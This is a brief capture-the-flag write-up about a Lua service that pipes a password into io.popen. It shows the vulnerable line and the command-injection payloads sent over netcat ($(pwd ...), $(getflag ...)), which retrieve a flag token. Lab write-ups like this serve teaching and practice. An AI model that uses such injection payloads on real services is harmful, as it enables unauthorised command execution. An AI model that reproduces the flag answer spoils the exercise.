We find a lua file that asks the user for a password
After checking for lua exploits, we find one in the function io.popen
'prog = io.popen("echo "..pass.." | sha1sum", "r")'
We can inject code through the password prompt in this function to be executed
First we have to open a connection to the server

$nc localhost 5151
Password: $(pwd > /dev/shm/output)
Erf nope..
$cat /dev/shm/output
/
It works, we try now with getflag

$nc localhost 5151
Password: $(getflag > /dev/shm/flag)
Erf nope..
$ cat /dev/shm/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
